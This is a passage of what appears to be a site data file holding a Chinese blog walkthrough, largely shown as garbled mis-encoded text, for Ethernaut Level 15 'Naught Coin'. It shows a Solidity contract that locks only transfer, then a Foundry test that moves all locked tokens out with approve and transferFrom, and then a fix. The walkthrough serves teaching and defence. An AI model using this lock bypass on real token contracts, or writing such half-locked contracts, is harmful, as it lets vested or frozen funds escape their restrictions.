Standard](https://eips.ethereum.org/EIPS/eip-20)\n-   [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)\n-   [Solidity Docs: Overriding](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding)","source":"_posts/ethernaut-level-15-naught-coin.md","raw":"---\ntitle: 'Ethernaut Level 15: Naught Coin - ERC20 approve/transferFromæ¼æ´'\ndate: 2025-01-25 16:20:00\nupdated: 2025-01-25 16:20:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - ERC20\n  - approve\n  - transferFrom\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"åˆ©ç”¨ERC20æ ‡å‡†ä¸­çš„ `approve` å’Œ `transferFrom` ç»„åˆï¼Œç»•è¿‡ä¸å®Œæ•´çš„ `transfer` å‡½æ•°é™åˆ¶ã€‚æ·±å…¥ç†è§£ERC20ä»£å¸æ ‡å‡†å’Œç»§æ‰¿è¦†ç›–çš„å®‰å…¨æ€§å½±å“ï¼ŒæŒæ¡ Naught Coin å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 15: Naught Coin - ERC20 approve/transferFromæ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 15 - Naught Coin](https://ethernaut.openzeppelin.com/level/15)  \n> **æ”»å‡»ç±»å‹**: ERC20 `approve`/`transferFrom` æ¼æ´  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½œä¸º `player`ï¼Œä½ åˆå§‹æ‹¥æœ‰å…¨éƒ¨çš„ `NaughtCoin` ä»£å¸ã€‚ç„¶è€Œï¼Œåˆçº¦ä¸­çš„ `transfer` å‡½æ•°è¢«é”å®šï¼Œåå¹´å†…æ— æ³•è½¬ç§»ä»£å¸ã€‚ä½ çš„ç›®æ ‡æ˜¯åœ¨é”å®šæœŸç»“æŸå‰ï¼Œå°†ä½ çš„å…¨éƒ¨ä»£å¸ä»ä½ çš„åœ°å€ä¸­è½¬ç§»å‡ºå»ã€‚\n\n![Naught Coin Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ `NaughtCoin` åˆçº¦ã€‚å®ƒç»§æ‰¿è‡ª OpenZeppelin çš„ `ERC20` æ ‡å‡†åˆçº¦ã€‚\n\n```solidity\ncontract NaughtCoin is ERC20 {\n    uint public timeLock;\n    address public player;\n\n    constructor(address _player) ERC20(\"NaughtCoin\", \"0x0\") {\n        player = _player;\n        timeLock = block.timestamp + 10 * 365 days;\n        _mint(player, 1000000 * (10**18));\n    }\n\n    modifier lockTokens() {\n        if (msg.sender == player) {\n            require(block.timestamp > timeLock, \"NaughtCoin: time lock is active\");\n            _;\n        } else {\n            _;\n        }\n    }\n\n    // Override transfer to lock tokens for the player\n    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {\n        return super.transfer(_to, _value);\n    }\n    \n    // Other functions are inherited from ERC20\n}\n```\n\nåˆçº¦é€šè¿‡ `override` é‡å†™äº† `transfer` å‡½æ•°ï¼Œå¹¶ä¸ºå…¶å¢åŠ äº†ä¸€ä¸ª `lockTokens` ä¿®é¥°ç¬¦ã€‚è¿™ä¸ªä¿®é¥°ç¬¦ä¼šæ£€æŸ¥ `msg.sender` æ˜¯å¦ä¸º `player`ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¦æ±‚ `block.timestamp` å¤§äº `timeLock`ï¼ˆåå¹´ä¹‹åï¼‰ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä½œä¸º `player`ï¼Œæ— æ³•ç›´æ¥è°ƒç”¨ `transfer` å‡½æ•°æ¥è½¬ç§»ä»£-ç¬”ã€‚\n\nç„¶è€Œï¼Œå¼€å‘è€…åªé‡å†™äº† `transfer` å‡½æ•°ï¼Œå´å¿½ç•¥äº† `ERC20` æ ‡å‡†ä¸­çš„å¦ä¸€ä¸ªé‡è¦çš„ä»£å¸è½¬ç§»å‡½æ•°ï¼š`transferFrom(address from, address to, uint256 amount)`ã€‚\n\n`transferFrom` å‡½æ•°å…è®¸ä¸€ä¸ªåœ°å€ï¼ˆ`spender`ï¼‰åœ¨å¾—åˆ° `owner` æˆæƒï¼ˆ`approve`ï¼‰åï¼Œä» `owner` çš„è´¦æˆ·ä¸­è½¬ç§»ä»£å¸åˆ°ä»»ä½•åœ°å€ã€‚\n\nç”±äº `NaughtCoin` åˆçº¦æ²¡æœ‰é‡å†™ `transferFrom`ï¼Œå®ƒå°†ç›´æ¥ä½¿ç”¨ OpenZeppelin `ERC20` åˆçº¦ä¸­çš„åŸå§‹å®ç°ï¼Œè€Œè¿™ä¸ªåŸå§‹å®ç°æ˜¯æ²¡æœ‰ `lockTokens` ä¿®é¥°ç¬¦çš„ï¼\n\nå› æ­¤ï¼Œæ”»å‡»è·¯å¾„å˜å¾—æ¸…æ™°ï¼š\n1.  æˆ‘ä»¬ï¼ˆ`player`ï¼‰è°ƒç”¨ `approve` å‡½æ•°ï¼Œæˆæƒç»™å¦ä¸€ä¸ªåœ°å€ï¼ˆå¯ä»¥æ˜¯è‡ªå·±ï¼Œä¹Ÿå¯ä»¥æ˜¯ä»»ä½•å…¶ä»–åœ°å€ï¼‰è½¬ç§»æˆ‘ä»¬çš„å…¨éƒ¨ä»£å¸ã€‚\n2.  æˆ‘ä»¬ï¼ˆæˆ–è¢«æˆæƒçš„åœ°å€ï¼‰è°ƒç”¨ `transferFrom` å‡½æ•°ï¼Œå°†ä»£å¸ä»æˆ‘ä»¬çš„è´¦æˆ·ä¸­è½¬ç§»å‡ºå»ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\nåœ¨ Foundry æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ã€‚æˆ‘ä»¬ç”šè‡³ä¸éœ€è¦ä¸€ä¸ªå•ç‹¬çš„æ”»å‡»åˆçº¦ï¼Œå› ä¸º `player` å¯ä»¥æˆæƒç»™è‡ªå·±æ¥æ‰§è¡Œ `transferFrom`ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/15_NaughtCoin.sol\";\n\ncontract NaughtCoinTest is Test {\n    NaughtCoin instance;\n    address player1;\n    address player2;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        player2 = vm.addr(2); // ä¸€ä¸ªç”¨äºæ¥æ”¶ä»£å¸çš„åœ°å€\n        instance = new NaughtCoin(player1);\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n\n        // è·å– player1 çš„å…¨éƒ¨ä½™é¢\n        uint256 playerBalance = instance.balanceOf(player1);\n\n        // æ­¥éª¤ 1: player1 æˆæƒç»™ player1 (è‡ªå·±) è½¬ç§»å…¨éƒ¨ä½™é¢\n        instance.approve(player1, playerBalance);\n\n        // æ­¥éª¤ 2: player1 è°ƒç”¨ transferFrom å°†è‡ªå·±çš„ä»£å¸è½¬ç§»åˆ° player2\n        instance.transferFrom(player1, player2, playerBalance);\n\n        // éªŒè¯ç»“æœ\n        assertEq(instance.balanceOf(player1), 0);\n        assertEq(instance.balanceOf(player2), playerBalance);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è·å–ä½™é¢**: é¦–å…ˆï¼Œç¡®å®š `player` åœ°å€æ‹¥æœ‰çš„ä»£å¸æ€»é‡ã€‚\n2.  **æˆæƒ (`approve`)**: `player` è°ƒç”¨ `instance.approve(spender, amount)`ï¼Œå…¶ä¸­ `spender` æ˜¯è¢«æˆæƒçš„åœ°å€ï¼Œ`amount` æ˜¯æˆæƒé¢åº¦ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è®© `player` æˆæƒç»™è‡ªå·±å…¨éƒ¨ä½™é¢ã€‚\n3.  **è½¬ç§» (`transferFrom`)**: `player` è°ƒç”¨ `instance.transferFrom(from, to, amount)`ï¼Œå…¶ä¸­ `from` æ˜¯ `player` åœ°å€ï¼Œ`to` æ˜¯æ¥æ”¶åœ°å€ï¼Œ`amount` æ˜¯è¦è½¬ç§»çš„æ•°é‡ã€‚\n\nè¿™ä¸ªè¿‡ç¨‹æˆåŠŸåœ°ç»•è¿‡äº† `transfer` å‡½æ•°çš„ `timeLock` é™åˆ¶ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **å®Œæ•´åœ°è¦†ç›–å‡½æ•°**: å½“ç»§æ‰¿ä¸€ä¸ªæ ‡å‡†ï¼ˆå¦‚ERC20ï¼‰å¹¶æ‰“ç®—ä¿®æ”¹å…¶æ ¸å¿ƒåŠŸèƒ½æ—¶ï¼Œå¿…é¡»ç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½è¢«ä¸€è‡´åœ°ä¿®æ”¹ã€‚åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œå¦‚æœ `transfer` è¢«é”å®šï¼Œé‚£ä¹ˆ `transferFrom` ä¹Ÿåº”è¯¥è¢«åŒæ ·çš„æ–¹å¼é”å®šã€‚\n\n    ```solidity\n    // æ­£ç¡®çš„ä¿®å¤æ–¹å¼\n    function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) {\n        return super.transferFrom(from, to, value);\n    }\n    ```\n\n2.  **ä½¿ç”¨æˆç†Ÿçš„ä»£å¸é”å®šåˆçº¦**: ä¸å…¶è‡ªå·±å®ç°æ—¶é—´é”ï¼Œä¸å¦‚ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œä¾‹å¦‚ OpenZeppelin çš„ `TokenTimelock` åˆçº¦ã€‚è¿™äº›åˆçº¦å·²ç»è€ƒè™‘äº†å„ç§è¾¹ç¼˜æƒ…å†µã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **ERC20 æ ‡å‡†**: æ·±å…¥ç†è§£ERC20ä»£å¸æ ‡å‡†çš„å…¨éƒ¨æ¥å£æ˜¯è‡³å…³é‡è¦çš„ï¼ŒåŒ…æ‹¬ `transfer`, `approve`, `transferFrom`, `balanceOf`, `allowance` ç­‰ã€‚\n-   **å‡½æ•°è¦†ç›– (`override`)**: åœ¨Solidityä¸­ï¼Œå½“å­åˆçº¦éœ€è¦ä¿®æ”¹çˆ¶åˆçº¦çš„è¡Œä¸ºæ—¶ï¼Œä½¿ç”¨ `override` å…³é”®å­—ã€‚ä½†å¿…é¡»å°å¿ƒï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„è¡Œä¸ºéƒ½è¢«è¦†ç›–ï¼Œä»¥é¿å…äº§ç”Ÿæ¼æ´ã€‚\n-   **Foundry `prank`**: `vm.startPrank` æ˜¯æ¨¡æ‹Ÿç‰¹å®šåœ°å€ï¼ˆå¦‚ `player`ï¼‰æ‰§è¡Œæ“ä½œçš„å¼ºå¤§å·¥å…·ï¼Œä½¿å¾—åœ¨æµ‹è¯•ä¸­æ¨¡æ‹Ÿå¤šæ­¥æ”»å‡»æµç¨‹å˜å¾—ç®€å•ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   ERC20æ ‡å‡†å®šä¹‰äº†ä¸€å¥—ä»£å¸äº¤äº’çš„æ¥å£ï¼Œä»…ä»…é™åˆ¶å…¶ä¸­ä¸€ä¸ªï¼ˆ`transfer`ï¼‰æ˜¯ä¸å¤Ÿçš„ã€‚\n-   `approve` å’Œ `transferFrom` çš„ç»„åˆæ˜¯ERC20çš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼Œå…è®¸ç¬¬ä¸‰æ–¹ä»£ä¸ºè½¬ç§»ä»£å¸ã€‚\n-   åœ¨è¿›è¡Œåˆçº¦ç»§æ‰¿å’Œå‡½æ•°è¦†ç›–æ—¶ï¼Œå¿…é¡»ä¿æŒé€»è¾‘çš„ä¸€è‡´æ€§ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å¼•å…¥æ¼æ´ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   è¯†åˆ«å‡ºåˆçº¦åªé™åˆ¶äº† `transfer` å‡½æ•°ï¼Œè€Œæ²¡æœ‰é™åˆ¶ `transferFrom` å‡½æ•°ã€‚\n-   åˆ©ç”¨ `approve` å’Œ `transferFrom` çš„æ ‡å‡†åŠŸèƒ½æ¥ç»•è¿‡ä¸å®Œæ•´çš„å®‰å…¨é™åˆ¶ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   åœ¨ä¿®æ”¹ç»§æ‰¿åˆçº¦çš„åŠŸèƒ½æ—¶ï¼Œè¿›è¡Œå…¨é¢çš„å½±å“åˆ†æï¼Œç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½å¾—åˆ°ä¸€è‡´çš„å¤„ç†ã€‚\n-   ä¼˜å…ˆä½¿ç”¨ç»è¿‡ç¤¾åŒºå®¡è®¡å’ŒéªŒè¯çš„æ ‡å‡†å®ç°ï¼Œè€Œä¸æ˜¯è‡ªå·±é‡æ–°å‘æ˜è½®å­ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)\n-   [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)\n-   [Solidity Docs: Overriding](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding)","slug":"ethernaut-level-15-naught-coin","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpd0015bf5q4u6y1hm6","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFromæ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFromæ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFromæ¼æ´\"></a>ğŸ¯ Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFromæ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/15\">Ethernaut Level 15 - Naught Coin</a><br><strong>æ”»å‡»ç±»å‹</strong>: ERC20 <code>approve</code>&#x2F;<code>transferFrom</code> æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä½œä¸º <code>player</code>ï¼Œä½ åˆå§‹æ‹¥æœ‰å…¨éƒ¨çš„ <code>NaughtCoin</code> ä»£å¸ã€‚ç„¶è€Œï¼Œåˆçº¦ä¸­çš„ <code>transfer</code> å‡½æ•°è¢«é”å®šï¼Œåå¹´å†…æ— æ³•è½¬ç§»ä»£å¸ã€‚ä½ çš„ç›®æ ‡æ˜¯åœ¨é”å®šæœŸç»“æŸå‰ï¼Œå°†ä½ çš„å…¨éƒ¨ä»£å¸ä»ä½ çš„åœ°å€ä¸­è½¬ç§»å‡ºå»ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg\" alt=\"Naught Coin Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ <code>NaughtCoin</code> åˆçº¦ã€‚å®ƒç»§æ‰¿è‡ª OpenZeppelin çš„ <code>ERC20</code> æ ‡å‡†åˆçº¦ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract NaughtCoin is ERC20 &#123;</span><br><span class=\"line\">    uint public timeLock;</span><br><span class=\"line\">    address public player;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class=\"line\">        player = _player;</span><br><span class=\"line\">        timeLock = block.timestamp + 10 * 365 days;</span><br><span class=\"line\">        _mint(player, 1000000 * (10**18));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier lockTokens() &#123;</span><br><span class=\"line\">        if (msg.sender == player) &#123;</span><br><span class=\"line\">            require(block.timestamp &gt; timeLock, &quot;NaughtCoin: time lock is active&quot;);</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Override transfer to lock tokens for the player</span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">        return super.transfer(_to, _value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // Other functions are inherited from ERC20</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>åˆçº¦é€šè¿‡ <code>override</code> é‡å†™äº† <code>transfer</code> å‡½æ•°ï¼Œå¹¶ä¸ºå…¶å¢åŠ äº†ä¸€ä¸ª <code>lockTokens</code> ä¿®é¥°ç¬¦ã€‚è¿™ä¸ªä¿®é¥°ç¬¦ä¼šæ£€æŸ¥ <code>msg.sender</code> æ˜¯å¦ä¸º <code>player</code>ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¦æ±‚ <code>block.timestamp</code> å¤§äº <code>timeLock</code>ï¼ˆåå¹´ä¹‹åï¼‰ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä½œä¸º <code>player</code>ï¼Œæ— æ³•ç›´æ¥è°ƒç”¨ <code>transfer</code> å‡½æ•°æ¥è½¬ç§»ä»£-ç¬”ã€‚</p>\n<p>ç„¶è€Œï¼Œå¼€å‘è€…åªé‡å†™äº† <code>transfer</code> å‡½æ•°ï¼Œå´å¿½ç•¥äº† <code>ERC20</code> æ ‡å‡†ä¸­çš„å¦ä¸€ä¸ªé‡è¦çš„ä»£å¸è½¬ç§»å‡½æ•°ï¼š<code>transferFrom(address from, address to, uint256 amount)</code>ã€‚</p>\n<p><code>transferFrom</code> å‡½æ•°å…è®¸ä¸€ä¸ªåœ°å€ï¼ˆ<code>spender</code>ï¼‰åœ¨å¾—åˆ° <code>owner</code> æˆæƒï¼ˆ<code>approve</code>ï¼‰åï¼Œä» <code>owner</code> çš„è´¦æˆ·ä¸­è½¬ç§»ä»£å¸åˆ°ä»»ä½•åœ°å€ã€‚</p>\n<p>ç”±äº <code>NaughtCoin</code> åˆçº¦æ²¡æœ‰é‡å†™ <code>transferFrom</code>ï¼Œå®ƒå°†ç›´æ¥ä½¿ç”¨ OpenZeppelin <code>ERC20</code> åˆçº¦ä¸­çš„åŸå§‹å®ç°ï¼Œè€Œè¿™ä¸ªåŸå§‹å®ç°æ˜¯æ²¡æœ‰ <code>lockTokens</code> ä¿®é¥°ç¬¦çš„ï¼</p>\n<p>å› æ­¤ï¼Œæ”»å‡»è·¯å¾„å˜å¾—æ¸…æ™°ï¼š</p>\n<ol>\n<li>æˆ‘ä»¬ï¼ˆ<code>player</code>ï¼‰è°ƒç”¨ <code>approve</code> å‡½æ•°ï¼Œæˆæƒç»™å¦ä¸€ä¸ªåœ°å€ï¼ˆå¯ä»¥æ˜¯è‡ªå·±ï¼Œä¹Ÿå¯ä»¥æ˜¯ä»»ä½•å…¶ä»–åœ°å€ï¼‰è½¬ç§»æˆ‘ä»¬çš„å…¨éƒ¨ä»£å¸ã€‚</li>\n<li>æˆ‘ä»¬ï¼ˆæˆ–è¢«æˆæƒçš„åœ°å€ï¼‰è°ƒç”¨ <code>transferFrom</code> å‡½æ•°ï¼Œå°†ä»£å¸ä»æˆ‘ä»¬çš„è´¦æˆ·ä¸­è½¬ç§»å‡ºå»ã€‚</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>åœ¨ Foundry æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ã€‚æˆ‘ä»¬ç”šè‡³ä¸éœ€è¦ä¸€ä¸ªå•ç‹¬çš„æ”»å‡»åˆçº¦ï¼Œå› ä¸º <code>player</code> å¯ä»¥æˆæƒç»™è‡ªå·±æ¥æ‰§è¡Œ <code>transferFrom</code>ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/15_NaughtCoin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract NaughtCoinTest is Test &#123;</span><br><span class=\"line\">    NaughtCoin instance;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\">    address player2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        player2 = vm.addr(2); // ä¸€ä¸ªç”¨äºæ¥æ”¶ä»£å¸çš„åœ°å€</span><br><span class=\"line\">        instance = new NaughtCoin(player1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // è·å– player1 çš„å…¨éƒ¨ä½™é¢</span><br><span class=\"line\">        uint256 playerBalance = instance.balanceOf(player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 1: player1 æˆæƒç»™ player1 (è‡ªå·±) è½¬ç§»å…¨éƒ¨ä½™é¢</span><br><span class=\"line\">        instance.approve(player1, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 2: player1 è°ƒç”¨ transferFrom å°†è‡ªå·±çš„ä»£å¸è½¬ç§»åˆ° player2</span><br><span class=\"line\">        instance.transferFrom(player1, player2, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ç»“æœ</span><br><span class=\"line\">        assertEq(instance.balanceOf(player1), 0);</span><br><span class=\"line\">        assertEq(instance.balanceOf(player2), playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è·å–ä½™é¢</strong>: é¦–å…ˆï¼Œç¡®å®š <code>player</code> åœ°å€æ‹¥æœ‰çš„ä»£å¸æ€»é‡ã€‚</li>\n<li><strong>æˆæƒ (<code>approve</code>)</strong>: <code>player</code> è°ƒç”¨ <code>instance.approve(spender, amount)</code>ï¼Œå…¶ä¸­ <code>spender</code> æ˜¯è¢«æˆæƒçš„åœ°å€ï¼Œ<code>amount</code> æ˜¯æˆæƒé¢åº¦ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è®© <code>player</code> æˆæƒç»™è‡ªå·±å…¨éƒ¨ä½™é¢ã€‚</li>\n<li><strong>è½¬ç§» (<code>transferFrom</code>)</strong>: <code>player</code> è°ƒç”¨ <code>instance.transferFrom(from, to, amount)</code>ï¼Œå…¶ä¸­ <code>from</code> æ˜¯ <code>player</code> åœ°å€ï¼Œ<code>to</code> æ˜¯æ¥æ”¶åœ°å€ï¼Œ<code>amount</code> æ˜¯è¦è½¬ç§»çš„æ•°é‡ã€‚</li>\n</ol>\n<p>è¿™ä¸ªè¿‡ç¨‹æˆåŠŸåœ°ç»•è¿‡äº† <code>transfer</code> å‡½æ•°çš„ <code>timeLock</code> é™åˆ¶ã€‚</p>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>å®Œæ•´åœ°è¦†ç›–å‡½æ•°</strong>: å½“ç»§æ‰¿ä¸€ä¸ªæ ‡å‡†ï¼ˆå¦‚ERC20ï¼‰å¹¶æ‰“ç®—ä¿®æ”¹å…¶æ ¸å¿ƒåŠŸèƒ½æ—¶ï¼Œå¿…é¡»ç¡®ä¿æ‰€æœ‰ç›¸å…³çš„å‡½æ•°éƒ½è¢«ä¸€è‡´åœ°ä¿®æ”¹ã€‚åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œå¦‚æœ <code>transfer</code> è¢«é”å®šï¼Œé‚£ä¹ˆ <code>transferFrom</code> ä¹Ÿåº”è¯¥è¢«åŒæ ·çš„æ–¹å¼é”å®šã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ­£ç¡®çš„ä¿®å¤æ–¹å¼</span><br><span class=\"line\">function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">    return super.transferFrom(from, to, value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä½¿ç”¨æˆç†Ÿçš„ä»£å¸é”å®šåˆçº¦</strong>: ä¸å…¶è‡ªå·±å®ç°æ—¶é—´é”ï¼Œä¸å¦‚ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œä¾‹å¦‚ OpenZeppelin çš„ <code>TokenTimelock</code> åˆçº¦ã€‚è¿™äº›åˆçº¦å·²ç»è€ƒè™‘äº†å„ç§è¾¹ç¼˜æƒ…å†µã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a 